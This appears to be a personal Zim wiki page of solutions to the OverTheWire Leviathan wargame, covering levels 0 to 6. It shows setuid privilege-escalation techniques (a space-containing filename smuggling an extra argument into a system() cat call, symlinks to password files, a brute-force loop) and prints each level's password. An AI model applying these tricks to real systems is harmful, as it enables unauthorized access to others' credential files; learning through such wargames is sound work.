@@ -1,0 +1,294 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2019-01-01T12:02:28-05:00
+
+====== Leviathan ======
+Created Tuesday 01 January 2019
+
+http://ainterr.github.io/blog/exploits/exercises/2017/05/21/otw-behemoth.html
+
+ For your convenience we have installed a few usefull tools which you can find
+ in the following locations:
+
+	* pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/
+	* peda (https://github.com/longld/peda.git) in /usr/local/peda/
+	* gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
+	* pwntools (https://github.com/Gallopsled/pwntools)
+	* radare2 (http://www.radare.org/)
+	* checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh
+
+
+==== Level 0 ====
+
+cd .backup
+grep password boomarks.html
+
+
+==== Level 1 ====
+
+leviathan1@leviathan:~$ ls -a
+.  ..  .bash_logout  .bashrc  check  .profile
+leviathan1@leviathan:~$ file check
+check: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c735f6f3a3a94adcad8407cc0fda40496fd765dd, not stripped
+
+leviathan1@leviathan:~$ ls -l check
+-r-sr-x--- 1 leviathan2 leviathan1 7452 Oct 29 21:17 check
+
+The set uid bit is set on the executable. This means whoever runs this executable, will be running it as the uid of the owner of the executable which happens to be leviathan2. Maybe we can use this to escalate our privileges.
+
+
+leviathan1@leviathan:~$ ./check
+password: password
+Wrong password, Good Bye ...
+
+What do?
+* objump -s check
+* readelf --all check
+
+results of objdump
+
+Contents of section .text:
+
+ 8048540 e4f0ff71 fc5589e5 535183ec 20c745f0  ...q.U..SQ.. .E.
+ 8048550 73657800 c745e973 65637266 c745ed65  __sex__..E.secrf.E.e
+ 8048560 74c645ef 00c745e5 676f6400 c745e06c  t.E...E.__god__..E.__l__
+ 8048570 6f7665c6 45e40083 ec0c6890 860408e8  __ove__.E.....h.....
+
+
+We manage to get a shell
+
+leviathan1@leviathan:~$ ./check
+password: sex
+$ id
+uid=12002(leviathan2) gid=12001(leviathan1) groups=12001(leviathan1)
+leviathan2@leviathan:/etc/leviathan_pass$ cd /etc/leviathan_pass/
+leviathan2@leviathan:/etc/leviathan_pass$ cat leviathan2
+ougahZi8Ta
+
+==== Level 2 ====
+
+'''
+leviathan2@leviathan:~$ ls -a
+.  ..  .bash_logout  .bashrc  printfile  .profile
+
+leviathan2@leviathan:~$ ls -l printfile
+-r-sr-x--- 1 leviathan3 leviathan2 7436 Oct 29 21:17 printfile
+leviathan2@leviathan:~$ file printfile
+printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=46891a094764828605a00c0c38abfccbe4b46548, not stripped
+'''
+
+
+Again, same premise, executable ELF with setuid bit. We can escalate privileges.
+
+'''
+leviathan2@leviathan:~$ ./printfile
+*** File Printer ***
+Usage: ./printfile filename
+'''
+
+
+
+Output of objump.
+
+'''
+Contents of section .rodata:
+ 8048688 03000000 01000200 2a2a2a20 46696c65  ........*** File
+ 8048698 20507269 6e746572 202a2a2a 00557361   Printer ***.Usa
+ 80486a8 67653a20 25732066 696c656e 616d650a  ge: %s filename.
+ 80486b8 00596f75 2063616e 74206861 76652074  .You cant have t
+ 80486c8 68617420 66696c65 2e2e2e00 2f62696e  hat file..../bin
+ 80486d8 2f636174 20257300                    /cat %s.
+'''
+
+
+ It seems whatever file we supply as input will be cat'd out. 
+
+'''
+leviathan2@leviathan:~$ ./printfile .bash_logout
+# ~/.bash_logout: executed by bash(1) when login shell exits.
+
+# when leaving the console clear the screen to increase privacy
+
+if [ "$SHLVL" = 1 ]; then
+    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
+'''
+
+
+Let's try suppling the password file as input. Remember, our permissions will be escalated to that of leviathan3, the owner of the executable.
+
+leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
+You cant have that file...
+
+The reason we are getting denied is because of an access call. What access() does is check permissions based on the process’ real user ID rather than the effective user ID. However setuid only effects the effective user id of a process.
+https://stackoverflow.com/questions/32455684/difference-between-real-user-id-effective-user-id-and-saved-user-id
+(Also see man access)
+
+'''
+leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
+__libc_start_main(0x804852b, 2, 0xffffd724, 0x8048610 <unfinished ...>
+access("/etc/leviathan_pass/leviathan3", 4)                                                   = -1
+puts("You cant have that file..."You cant have that file...
+)                                                            = 27
++++ exited (status 1) +++
+'''
+
+
+We need a way to trick the program to let us access the file, even though our real user id does not have privilege to do so.
+
+leviathan2@leviathan:~$ cd /tmp/supa
+leviathan2@leviathan:/tmp/supa$ touch "file with_space"
+leviathan2@leviathan:/tmp/supa$ ~/printfile "file with_space"
+/bin/cat: file: No such file or directory
+/bin/cat: with_space: No such file or directory
+
+leviathan2@leviathan:/tmp/supa$ ltrace ~/printfile "file with_space"
+__libc_start_main(0x804852b, 2, 0xffffd724, 0x8048610 <unfinished ...>
+access("file with_space", 4)                                                                  = 0
+snprintf("/bin/cat file with_space", 511, "/bin/cat %s", "file with_space")                   = 24
+geteuid()                                                                                     = 12002
+geteuid()                                                                                     = 12002
+setreuid(12002, 12002)                                                                        = 0
+__system("/bin/cat file with_space"/bin/cat: file: No such file or directory__
+__/bin/cat: with_space: No such file or directory__
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                                        = 256
++++ exited (status 0) +++
+
+
+We see that the system runs after our (real) privileges have been checked against the file that we created. [[/bin/cat]] then splits the file with a space in its name into two files. 
+
+leviathan2@leviathan:/tmp/supa$ ln -s /etc/leviathan_pass/leviathan3 file
+leviathan2@leviathan:/tmp/supa$ ~/printfile file\ with_space
+Ahdiemoo1j
+/bin/cat: with_space: No such file or directory
+
+
+==== Level 3 ====
+
+leviathan3@leviathan:~$ file level3
+level3: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=ed9f6a6d1c89cf1f3f2eff370de4fb1669774fd5, not stripped
+leviathan3@leviathan:~$ ls -la
+total 32
+drwxr-xr-x  2 root       root        4096 Oct 29 21:17 .
+drwxr-xr-x 10 root       root        4096 Oct 29 21:17 ..
+-rw-r--r--  1 root       root         220 May 15  2017 .bash_logout
+-rw-r--r--  1 root       root        3526 May 15  2017 .bashrc
+-r-sr-x---  1 leviathan4 leviathan3 10288 Oct 29 21:17 level3
+-rw-r--r--  1 root       root         675 May 15  2017 .profile
+
+
+leviathan3@leviathan:~$ ./level3
+Enter the password> password
+bzzzzzzzzap. WRONG
+
+leviathan3@leviathan:~$ ltrace ./level3
+__libc_start_main(0x8048618, 1, 0xffffd754, 0x80486d0 <unfinished ...>
+strcmp("h0no33", "kakaka")                                                                    = -1
+printf("Enter the password> ")                                                                = 20
+fgets(Enter the password> h0no33
+"h0no33\n", 256, 0xf7fc55a0)                                                            = 0xffffd560
+__strcmp("h0no33\n", "snlprintf\n")                                                             = -1__
+puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
+)                                                                    = 19
++++ exited (status 0) +++
+
+
+Hmmmm, could snlprintf be the password?
+
+leviathan3@leviathan:~$ ./level3
+Enter the password> snlprintf
+[You've got shell]!
+$
+$ id
+uid=12004(leviathan4) gid=12003(leviathan3) groups=12003(leviathan3)
+$ /bin/cat /etc/leviathan_pass/leviathan4
+vuH0coox6m
+
+
+==== Level 4 ====
+
+leviathan4@leviathan:~$ ls -a
+.  ..  .bash_logout  .bashrc  .profile  .trash
+
+leviathan4@leviathan:~/.trash$ file bin
+bin: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=00ce1aa55b0e691470f61baff0ee59a6c33fcb50, not stripped
+
+leviathan4@leviathan:~/.trash$ ls -la bin
+-r-sr-x--- 1 leviathan5 leviathan4 7352 Oct 29 21:17 bin
+
+tsk tsk. ELF executable with setuid. When will they learn.
+
+leviathan4@leviathan:~/.trash$ ./bin
+01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
+
+Looks like binary. Google search and translate reveals the following password.
+Tith4cokei
+
+==== Level 5 ====
+
+leviathan5
+leviathan5@leviathan:~$ ls -a
+.  ..  .bash_logout  .bashrc  leviathan5  .profile
+leviathan5: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=414fe0634bbd08f446816d4da55ea9a43484fc35, not stripped
+leviathan5@leviathan:~$ ls -lh leviathan5
+-r-sr-x--- 1 leviathan6 leviathan5 7.4K Oct 29 21:17 leviathan5
+
+leviathan5@leviathan:~$ ./leviathan5
+Cannot find /tmp/file.log
+
+
+leviathan5@leviathan:~$ ltrace ./leviathan5
+__libc_start_main(0x80485db, 1, 0xffffd754, 0x80486a0 <unfinished ...>
+fopen("/tmp/file.log", "r")                                                                   = 0
+puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
+)                                                             = 26
+exit(-1 <no return ...>
++++ exited (status 255) +++
+
+Sure enough, [[/tmp/file.log]] does not exist. 
+
+''ls: cannot access '/tmp/file.log': No such file or directory''
+
+Let's create a symbolic link that we have permission to access (with our real uid), but with our effective uid the executable will open and read the file the symbolic link points to. 
+
+''leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan5 /tmp/file.log''
+
+leviathan5@leviathan:~$ ./leviathan5
+UgaoFee4li
+
+Lesson learned: fopen() works on symbolic links. However it only takes effect AFTER relevant (effective/real) permissions have been applied.
+
+==== Level 6 ====
+
+leviathan6@leviathan:~$ ls -a
+.  ..  .bash_logout  .bashrc  leviathan6  .profile
+leviathan6@leviathan:~$ ls -l leviathan6
+-r-sr-x--- 1 leviathan7 leviathan6 7452 Oct 29 21:17 leviathan6
+leviathan6@leviathan:~$ file leviathan6
+leviathan6: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=30bfe37691e013d638a271635abbb3ade6b5d20b, not stripped
+
+leviathan6@leviathan:~$ ./leviathan6
+usage: ./leviathan6 <4 digit code>
+
+Brute force the mutha
+
+'''
+for i in {0000..9999};
+do
+  ./leviathan6 $i
+done
+'''
+
+
+$ id
+uid=12007(leviathan7) gid=12006(leviathan6) groups=12006(leviathan6)
+$ cat /etc/leviathan_pass/leviathan7
+ahy7MaeBo9
+
+
+
+
+== Questions ==
+
+How to automate input to manual bash script?
